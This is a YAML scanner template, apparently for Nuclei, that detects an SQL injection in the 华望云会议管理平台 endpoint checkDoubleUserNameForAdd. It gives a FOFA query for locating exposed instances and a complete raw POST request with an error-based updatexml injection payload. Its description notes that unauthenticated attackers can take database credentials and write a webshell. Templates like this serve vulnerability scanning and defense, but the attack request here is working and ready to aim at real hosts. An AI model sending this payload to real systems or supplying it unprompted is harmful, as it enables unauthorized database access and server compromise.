id: huawangyun-checkDoubleUserNameForAdd-sql

info:
  tags: huawangyun-checkDoubleUserNameForAdd-sql
  name: 华望云会议管理平台 checkDoubleUserNameForAdd SQL注入漏洞
  author: xc
  severity: high
  description: |-
    fofa: title="	华望云会议管理平台	"
    华望云会议管理平台 checkDoubleUserNameForAdd 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。


http:
  - raw:
      - |
        POST /ajax/checkDoubleUserNameForAdd HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        userName=1%25'+and+1%3d(updatexml(0x7e,concat(1,(select+MD5(123456))),1))+and+'%25%25'+like+'
    matchers:
      - type: word
        part: body
        words:
          - 'e10adc3949ba59abbe56e057f20f883e'



